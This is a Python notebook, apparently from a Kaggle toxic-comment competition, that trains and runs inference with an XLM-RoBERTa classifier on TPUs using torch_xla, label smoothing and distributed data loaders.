        #may_debug(True)
        try:
            self.score = sklearn.metrics.roc_auc_score(self.y_true, self.y_pred, labels=np.array([0, 1]))
        except Exception:
            self.score = 0
        self.mc_score = matthews_correlation(self.y_true_float, self.y_pred)
        self.aux_part = aux_part

    @property
    def avg(self):
        return self.score
    @property
    def mc_avg(self):
        return self.mc_score

class AverageMeter(object):
    """Computes and stores the average and current value"""
    def __init__(self):
        self.reset()

    def reset(self):
        self.val = 0
        self.avg = 0
        self.sum = 0
        self.count = 0

    def update(self, val, n=1):
        self.val = val
        self.sum += val * n
        self.count += n
        self.avg = self.sum / self.count



# + colab_type="code" id="Ow13PTlFwbiH" colab={}
import warnings

warnings.filterwarnings("ignore")

import torch_xla
import torch_xla.core.xla_model as xm
import torch_xla.distributed.parallel_loader as pl
import torch_xla.distributed.xla_multiprocessing as xmp

from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler

class TPUFitter:

    def __init__(self, model, device, config):
        if not os.path.exists('node_submissions'):
            os.makedirs('node_submissions')

        self.config = config
        self.epoch = 0
        self.log_path = 'log.txt'

        self.model = model
        self.device = device

        param_optimizer = list(self.model.named_parameters())
        no_decay = ['bias', 'LayerNorm.bias', 'LayerNorm.weight']
        optimizer_grouped_parameters = [
            {'params': [p for n, p in param_optimizer if not any(nd in n for nd in no_decay)], 'weight_decay': 0.001},
            {'params': [p for n, p in param_optimizer if any(nd in n for nd in no_decay)], 'weight_decay': 0.0}
        ]

        self.optimizer = AdamW(optimizer_grouped_parameters, lr=config.lr*xm.xrt_world_size())
        self.scheduler = config.SchedulerClass(self.optimizer, **config.scheduler_params)

        self.criterion = config.criterion
        xm.master_print(f'Fitter prepared. Device is {self.device}')

    def fit(self, train_loader, validation_loader):
        for e in range(self.config.n_epochs):
            if self.config.verbose:
                lr = self.optimizer.param_groups[0]['lr']
                timestamp = datetime.utcnow().isoformat()
                self.log(f'\n{timestamp}\nLR: {lr}')

            t = time.time()
            para_loader = pl.ParallelLoader(train_loader, [self.device])
            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))

            self.log(f'[RESULT]: Train. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, mc_score: {final_scores.mc_avg:.5f}, time: {(time.time() - t):.5f}')

            t = time.time()
            para_loader = pl.ParallelLoader(validation_loader, [self.device])
            losses, final_scores = self.validation(para_loader.per_device_loader(self.device))

            self.log(f'[RESULT]: Validation. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, mc_score: {final_scores.mc_avg:.5f}, time: {(time.time() - t):.5f}')

            if self.config.validation_scheduler:
                self.scheduler.step(metrics=final_scores.mc_avg)

            self.epoch += 1

    def run_tuning_and_inference(self, test_loader, validation_tune_loader):
        for e in range(2):
            self.optimizer.param_groups[0]['lr'] = self.config.lr*xm.xrt_world_size()
            para_loader = pl.ParallelLoader(validation_tune_loader, [self.device])
            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))
            para_loader = pl.ParallelLoader(test_loader, [self.device])
            self.run_inference(para_loader.per_device_loader(self.device))

    def validation(self, val_loader):
        self.model.eval()
        losses = AverageMeter()
        final_scores = RocAucMeter()

        t = time.time()

        for step, (targets, inputs, attention_masks) in enumerate(val_loader):
            if self.config.verbose:
                if step % self.config.verbose_step == 0:
                    xm.master_print(
                        f'Valid Step {step}, loss: ' + \
                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, mc_score: {final_scores.mc_avg:.5f}, ' + \
                        f'time: {(time.time() - t):.5f}'
                    )
            with torch.no_grad():
                inputs = inputs.to(self.device, dtype=torch.long)
                attention_masks = attention_masks.to(self.device, dtype=torch.long)
                targets = targets.to(self.device, dtype=torch.float)

                outputs = self.model(inputs, attention_masks)
                loss = self.criterion(outputs, targets)

                batch_size = inputs.size(0)

                final_scores.update(targets, outputs)
                losses.update(loss.detach().item(), batch_size)

        return losses, final_scores

    def train_one_epoch(self, train_loader):
        self.model.train()

        losses = AverageMeter()
        final_scores = RocAucMeter()
        t = time.time()

        for step, (targets, inputs, attention_masks) in enumerate(train_loader):
            if self.config.verbose:
                if step % self.config.verbose_step == 0:
                    self.log(
                        f'Train Step {step}, loss: ' + \
                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, mc_score: {final_scores.mc_avg:.5f}, ' + \
                        f'time: {(time.time() - t):.5f}'
                    )

            inputs = inputs.to(self.device, dtype=torch.long)
            attention_masks = attention_masks.to(self.device, dtype=torch.long)
            targets = targets.to(self.device, dtype=torch.float)

            self.optimizer.zero_grad()

            outputs = self.model(inputs, attention_masks)
            loss = self.criterion(outputs, targets)

            batch_size = inputs.size(0)

            final_scores.update(targets, outputs)

            losses.update(loss.detach().item(), batch_size)

            loss.backward()
            xm.optimizer_step(self.optimizer)

            if self.config.step_scheduler:
                self.scheduler.step()

        self.model.eval()
        self.save('last-checkpoint.bin')

        return losses, final_scores

    def run_inference(self, test_loader):
        self.model.eval()
        result = {'id': [], 'toxic': []}
        t = time.time()

        for step, (ids, inputs, attention_masks) in enumerate(test_loader):
            if self.config.verbose:
                if step % self.config.verbose_step == 0:
                    xm.master_print(f'Prediction Step {step}, time: {(time.time() - t):.5f}')

            with torch.no_grad():
                inputs = inputs.to(self.device, dtype=torch.long)
                attention_masks = attention_masks.to(self.device, dtype=torch.long)
                outputs = self.model(inputs, attention_masks)
                toxics = nn.functional.softmax(outputs, dim=1).data.cpu().numpy()[:,1]

            result['id'].extend(ids.cpu().numpy())
            result['toxic'].extend(toxics)

        result = pd.DataFrame(result)
        node_count = len(glob('node_submissions/*.csv'))
        result.to_csv(f'node_submissions/submission_{node_count}_{datetime.utcnow().microsecond}_{random.random()}.csv', index=False)

    def save(self, path):
        xm.save(self.model.state_dict(), path)

    def log(self, message):
        if self.config.verbose:
            xm.master_print(message)
        with open(self.log_path, 'a+') as logger:
            xm.master_print(f'{message}', logger)


# + colab_type="code" id="kO9ovGhdwb7W" colab={}
from transformers import XLMRobertaModel

class ToxicSimpleNNModel(nn.Module):

    def __init__(self, use_aux=True):
        super(ToxicSimpleNNModel, self).__init__()
        self.backbone = XLMRobertaModel.from_pretrained(BACKBONE_PATH)
        self.dropout = nn.Dropout(0.3)
        aux_len = 0

        if use_aux:
            aux_len = 5
        self.linear = nn.Linear(
            in_features=self.backbone.pooler.dense.out_features*2,
            out_features=2+aux_len,
        )

    def forward(self, input_ids, attention_masks):
        bs, seq_length = input_ids.shape
        seq_x, _ = self.backbone(input_ids=input_ids, attention_mask=attention_masks)
        apool = torch.mean(seq_x, 1)
        mpool, _ = torch.max(seq_x, 1)
        x = torch.cat((apool, mpool), 1)
        x = self.dropout(x)

        return self.linear(x)



# + colab_type="code" id="arcC5IeYxUbr" colab={}
from kaggle_runner import may_debug


class LabelSmoothing(nn.Module):
    """https://github.com/pytorch/pytorch/issues/7455#issuecomment-513062631"""

    def __init__(self, smoothing = 0.1, dim=-1):
        super(LabelSmoothing, self).__init__()
        self.cls = 2
        self.confidence = 1.0 - smoothing
        self.smoothing = smoothing
        self.dim = dim

    def forward(self, x, target):
        if self.training:
            pred = x[:,:2].log_softmax(dim=self.dim)
            aux=x[:, 2:]

            toxic_target = target[:,:2]
            aux_target = target[:, 2:]
            with torch.no_grad():
                # smooth_toxic = pred.data.clone()
                smooth_toxic = self.smoothing + (1-self.smoothing*2)*toxic_target
                # smooth_toxic.scatter_(1, toxic_target.data.unsqueeze(1), self.confidence) # only for 0 1 label, put confidence to related place
                # for 0-1, 0 -> 0.1, 1->0.9.(if 1), if zero. 0->0.9, 1->0.1
                smooth_aux = self.smoothing + (1-self.smoothing*2)*aux_target  # only for binary cross entropy, so for lable, it is (1-smooth)*

            aux_loss = torch.nn.functional.binary_cross_entropy_with_logits(aux, smooth_aux)

            return torch.mean(torch.sum(-smooth_toxic * pred, dim=self.dim)) + aux_loss/3
        else:
            return torch.nn.functional.cross_entropy(x[:,:2], target[:,:2])


# + colab_type="code" id="dZmTJ4XQwb9y" colab={}
class TrainGlobalConfig:
    """ Global Config for this notebook """
    num_workers = 0  # количество воркеров для loaders
    batch_size = 16  # bs
    n_epochs = 2  # количество эпох для обучения
    lr = 0.5 * 1e-5 # стартовый learning rate (внутри логика работы с мульти TPU домножает на кол-во процессов)
    fold_number = 0  # номер фолда для обучения

    # -------------------
    verbose = True  # выводить принты
    verbose_step = 25  # количество шагов для вывода принта
    # -------------------

    # --------------------
    step_scheduler = False  # выполнять scheduler.step после вызова optimizer.step
    validation_scheduler = True  # выполнять scheduler.step после валидации loss (например для плато)
    SchedulerClass = torch.optim.lr_scheduler.ReduceLROnPlateau
    scheduler_params = dict(
        mode='max',
        factor=0.7,
        patience=0,
        verbose=False,
        threshold=0.0001,
        threshold_mode='abs',
        cooldown=0,
        min_lr=1e-8,
        eps=1e-08
    )
    # --------------------

    # -------------------
    criterion = LabelSmoothing()
    # -------------------


# + colab_type="code" id="_79qoceFwcAF" colab={}
net = ToxicSimpleNNModel()


# + colab={} colab_type="code" id="InecI_CbxXA_"
def _test_model_fn(device=torch.device("cpu")):
    "test with CPU, easier to debug"
    from kaggle_runner import logger
    net.to(device)

    test_loader = torch.utils.data.DataLoader(
        test_dataset,
        batch_size=TrainGlobalConfig.batch_size,
    #    sampler=test_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )

    def validation(model, device, config, val_loader, criterion):
        model.eval()
        losses = AverageMeter()
        final_scores = RocAucMeter()

        t = time.time()

        for step, (targets, inputs, attention_masks) in enumerate(val_loader):
            if config.verbose:
                if step % config.verbose_step == 0:
                    logger.info(
                        f'Valid Step {step}, loss: ' + \
                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, mc_score: {final_scores.mc_avg:.5f}, ' + \
                        f'time: {(time.time() - t):.5f}'
                    )
            with torch.no_grad():
                inputs = inputs.to(device, dtype=torch.long)
                attention_masks = attention_masks.to(device, dtype=torch.long)
                targets = targets.to(device, dtype=torch.float)

                outputs = model(inputs, attention_masks)
                loss = criterion(outputs, targets)

                batch_size = inputs.size(0)

                final_scores.update(targets, outputs)
                losses.update(loss.detach().item(), batch_size)

    def run_inference(model, device, config, test_loader):
        model.eval()
        result = {'id': [], 'toxic': []}
        t = time.time()

        for step, (ids, inputs, attention_masks) in enumerate(test_loader):
            if config.verbose:
                if step % config.verbose_step == 0:
                    logger.info(f'Prediction Step {step}, time: {(time.time() - t):.5f}')

            with torch.no_grad():
                inputs = inputs.to(device, dtype=torch.long)
                attention_masks = attention_masks.to(device, dtype=torch.long)
                outputs = model(inputs, attention_masks)
                toxics = nn.functional.softmax(outputs, dim=1).data.cpu().numpy()[:,1]

            result['id'].extend(ids.cpu().numpy())
            result['toxic'].extend(toxics)

        return result
    validation_loader = torch.utils.data.DataLoader(
        validation_dataset,
        batch_size=TrainGlobalConfig.batch_size,
    #    sampler=validation_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )

    #train_sampler = DistributedSamplerWrapper(
    #    sampler=BalanceClassSampler(labels=train_dataset.get_labels(), mode="downsampling"),
    #    num_replicas=xm.xrt_world_size(),
    #    rank=xm.get_ordinal(),
    #    shuffle=True
    #)
    #train_loader = torch.utils.data.DataLoader(
    #    train_dataset,
    #    batch_size=TrainGlobalConfig.batch_size,
    #    sampler=train_sampler,
    #    pin_memory=False,
    #    drop_last=True,
    #    num_workers=TrainGlobalConfig.num_workers,
    #)
    #validation_tune_sampler = torch.utils.data.distributed.DistributedSampler(
    #    validation_tune_dataset,
    #    num_replicas=xm.xrt_world_size(),
    #    rank=xm.get_ordinal(),
    #    shuffle=True
    #)
    validation_tune_loader = torch.utils.data.DataLoader(
        validation_tune_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        #sampler=validation_tune_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )
    #test_sampler = torch.utils.data.distributed.DistributedSampler(
    #    test_dataset,
    #    num_replicas=xm.xrt_world_size(),
    #    rank=xm.get_ordinal(),
    #    shuffle=False
    #)
    test_loader = torch.utils.data.DataLoader(
        test_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        #sampler=test_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )

    def train_one_epoch(self, train_loader):
        self.model.train()

        losses = AverageMeter()
        final_scores = RocAucMeter()
        t = time.time()

        for step, (targets, inputs, attention_masks) in enumerate(train_loader):
            if self.config.verbose:
                if step % self.config.verbose_step == 0:
                    self.log(
                        f'Train Step {step}, loss: ' + \
                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, mc_score: {final_scores.mc_avg:.5f}, ' + \
                        f'time: {(time.time() - t):.5f}'
                    )

            inputs = inputs.to(self.device, dtype=torch.long)
            attention_masks = attention_masks.to(self.device, dtype=torch.long)
            targets = targets.to(self.device, dtype=torch.float)

            self.optimizer.zero_grad()

            outputs = self.model(inputs, attention_masks)
            loss = self.criterion(outputs, targets)

            batch_size = inputs.size(0)

            final_scores.update(targets, outputs)

            losses.update(loss.detach().item(), batch_size)

            loss.backward()
            xm.optimizer_step(self.optimizer)

            if self.config.step_scheduler:
                self.scheduler.step()

        self.model.eval()
        #self.save('last-checkpoint.bin')

        return losses, final_scores

    def run_tuning_and_inference(self, test_loader, validation_tune_loader):
        for e in range(1):
            self.optimizer.param_groups[0]['lr'] = self.config.lr*8
            losses, final_scores = self.train_one_epoch(validation_tune_loader)
            run_inference(net, device, TrainGlobalConfig, validation_loader)

    #fitter = TPUFitter(model=net, device=device, config=TrainGlobalConfig)
    #from types import MethodType
    #fitter.train_one_epoch = MethodType(train_one_epoch, fitter)
    #fitter.run_tuning_and_inference = MethodType(run_tuning_and_inference, fitter)

    #fitter.run_tuning_and_inference(test_loader, validation_tune_loader)  # error happens here

    losses, final_scores = validation(net, device, TrainGlobalConfig, validation_loader, TrainGlobalConfig.criterion)
    logger.info(f"Val results: losses={losses}, final_scores={final_scores}")

    results = run_inference(net, device, TrainGlobalConfig, validation_loader)
    logger.info(f"Test done, result len %d", len(results))

# + colab_type="code" id="INecI_CbxXA_" colab={}
def _mp_fn(rank, flags):
    device = xm.xla_device()
    net.to(device)

    train_sampler = DistributedSamplerWrapper(
        sampler=BalanceClassSampler(labels=train_dataset.get_labels(), mode="downsampling"),
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=True
    )
    train_loader = torch.utils.data.DataLoader(
        train_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=train_sampler,
        pin_memory=False,
        drop_last=True,
        num_workers=TrainGlobalConfig.num_workers,
    )
    validation_sampler = torch.utils.data.distributed.DistributedSampler(
        validation_dataset,
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=False
    )
    validation_loader = torch.utils.data.DataLoader(
        validation_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=validation_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )
    validation_tune_sampler = torch.utils.data.distributed.DistributedSampler(
        validation_tune_dataset,
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=True
    )
    validation_tune_loader = torch.utils.data.DataLoader(
        validation_tune_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=validation_tune_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )
    test_sampler = torch.utils.data.distributed.DistributedSampler(
        test_dataset,
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=False
    )
    test_loader = torch.utils.data.DataLoader(
        test_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=test_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )

    if rank == 0:
        time.sleep(1)

    fitter = TPUFitter(model=net, device=device, config=TrainGlobalConfig)
    fitter.fit(train_loader, validation_loader)
    fitter.run_tuning_and_inference(test_loader, validation_tune_loader)


# + colab_type="code" id="aKuUULH7l5W1" outputId="5c7f42e6-5ff1-486a-f527-ee861b3da71f" colab={"base_uri": "https://localhost:8080/", "height": 447}
FLAGS={}
xmp.spawn(_mp_fn, args=(FLAGS,), nprocs=8, start_method='fork')
from datetime import date; today = date.today()
output_model_file='XLMRobertaModel_tpu_trained.bin'
torch.save(net.state_dict(), f"{today}_{output_model_file}")

# + colab_type="code" id="Wu0VhhZAFuYs" colab={}
submission = pd.concat([pd.read_csv(path) for path in glob('node_submissions/*.csv')]).groupby('id').mean()
submission['toxic'].hist(bins=100)

# + colab_type="code" id="RRr-yzJ_yVTW" colab={}
submission.to_csv(f'{ROOT_PATH}/submission.csv')

# + colab_type="code" id="ARz9TllfyVVa" colab={}
# # !cp log.txt '/content/drive/My Drive/jigsaw2020-kaggle-public-baseline/'
# !make push_dataset

# + id="qjzo_wu8UqiL" colab_type="code" colab={}
#PROJECT_ID = 'go-2-learn'
#from google.cloud import storage
#storage_client = storage.Client(project=PROJECT_ID)
